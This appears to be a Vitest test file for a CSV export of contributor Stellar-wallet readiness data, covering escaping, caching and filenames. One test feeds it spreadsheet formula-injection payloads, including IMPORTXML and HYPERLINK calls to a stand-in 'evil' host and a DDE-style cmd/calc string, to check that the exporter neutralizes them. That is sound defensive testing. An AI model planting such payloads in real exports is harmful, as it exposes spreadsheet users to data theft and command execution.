import { describe, it, expect, beforeEach } from "vitest";
import {
  buildContributorsCsv,
  getContributorsCsvFilename,
  getCachedCsv,
  invalidateCsvCache,
} from "./csv-export";
import type { ContributorRow } from "@/types";

describe("csv-export", () => {
  const mockContributors: ContributorRow[] = [
    {
      id: "1",
      githubUsername: "alice",
      stellarAddress: "GA1234567890ABCDEF",
      funded: true,
      trustlineReady: true,
      trustlineAuthorized: true,
      verified: true,
      xlmBalance: "100.5",
      spendableXlmBalance: "99.5",
      readiness: "ready",
      lastCheckedAt: "2026-07-25T10:00:00Z",
    },
    {
      id: "2",
      githubUsername: "bob",
      stellarAddress: "GB1234567890ABCDEF",
      funded: true,
      trustlineReady: false,
      trustlineAuthorized: false,
      verified: false,
      xlmBalance: "50.0",
      spendableXlmBalance: "48.0",
      readiness: "not_ready",
      lastCheckedAt: "2026-07-24T10:00:00Z",
    },
  ];

  beforeEach(() => {
    invalidateCsvCache();
  });

  it("should build CSV with correct headers and data", () => {
    const csv = buildContributorsCsv(mockContributors);

    expect(csv).toContain('"id","githubUsername","stellarAddress"');
    expect(csv).toContain('"1","alice"');
    expect(csv).toContain('"2","bob"');
    expect(csv).toContain('"ready"');
    expect(csv).toContain('"not_ready"');
    expect(csv).toContain("TrustBridge Freighter ownership proof");
  });

  it("should handle empty contributor list", () => {
    const csv = buildContributorsCsv([]);
    expect(csv).toContain('"id","githubUsername","stellarAddress"');
  });

  it("should escape CSV special characters correctly", () => {
    const contributor: ContributorRow = {
      ...mockContributors[0],
      githubUsername: 'alice"quoted"name',
    };

    const csv = buildContributorsCsv([contributor]);
    expect(csv).toContain('alice""quoted""name');
  });

  it("should generate filename with date", () => {
    const date = new Date("2026-07-25");
    const filename = getContributorsCsvFilename(date);

    expect(filename).toBe("contributors-2026-07-25.csv");
  });

  it("should cache CSV and return same data", () => {
    const csv1 = getCachedCsv(mockContributors);
    const csv2 = getCachedCsv([]);

    expect(csv1).toBe(csv2);
  });

  it("should invalidate cache", () => {
    const csv1 = getCachedCsv(mockContributors);
    invalidateCsvCache();
    const csv2 = getCachedCsv([]);

    expect(csv1).not.toBe(csv2);
  });

  it("should handle null lastCheckedAt", () => {
    const contributor: ContributorRow = {
      ...mockContributors[0],
      lastCheckedAt: null,
    };

    const csv = buildContributorsCsv([contributor]);
    expect(csv).toContain('"ready","","All Horizon readiness checks currently pass for this row."');
  });

  it("should format boolean values as yes/no", () => {
    const csv = buildContributorsCsv(mockContributors);

    expect(csv).toContain('"yes"');
    expect(csv).toContain('"no"');
  });

  it("neutralizes formula payloads in usernames, notes and debug fields", () => {
    const contributor: ContributorRow = {
      ...mockContributors[0],
      githubUsername: '=IMPORTXML("http://evil")',
      stellarAddress: "-=cmd",
      xlmBalance: "-12.5",
      spendableXlmBalance: "+3.25",
      horizonDebug: {
        summary: "@SUM(1,2) malicious note",
        nextAction: "+cmd|' /C calc'!A0",
        checkpoints: [],
        warnings: [],
      },
      walletProof: {
        provider: "Freighter",
        method: "signMessage",
        challenge: "\t=HYPERLINK(\"http://evil\")",
        instructions: [],
        fallback: "",
      },
    };

    const csv = buildContributorsCsv([contributor]);
    expect(csv).toContain(`"'=IMPORTXML(""http://evil"")"`);
    expect(csv).toContain(`"'@SUM(1,2) malicious note"`);
    expect(csv).toContain(`"'+cmd|' /C calc'!A0"`);
    expect(csv).toContain(`"'\t=HYPERLINK(""http://evil"")"`);
    expect(csv).toContain('"-12.5"');
    expect(csv).toContain('"+3.25"');
    expect(csv).not.toContain('"=IMPORTXML');
    expect(csv).not.toContain('"@SUM');
  });

  it("handles null and undefined formula-adjacent values", () => {
    const contributor = {
      ...mockContributors[0],
      githubUsername: undefined,
      horizonDebug: {
        summary: null,
        nextAction: undefined,
        checkpoints: [],
        warnings: [],
      },
    } as unknown as ContributorRow;

    const csv = buildContributorsCsv([contributor]);
    expect(csv).toContain('"","');
    expect(csv).toContain('"","","');
  });

  it("derives debug and proof fields when they are missing on the row", () => {
    const csv = buildContributorsCsv([
      {
        ...mockContributors[1],
        walletProof: undefined,
        horizonDebug: undefined,
      },
    ]);

    expect(csv).toContain("Required USDC trustline is missing.");
    expect(csv).toContain("TrustBridge Freighter ownership proof");
  });
});
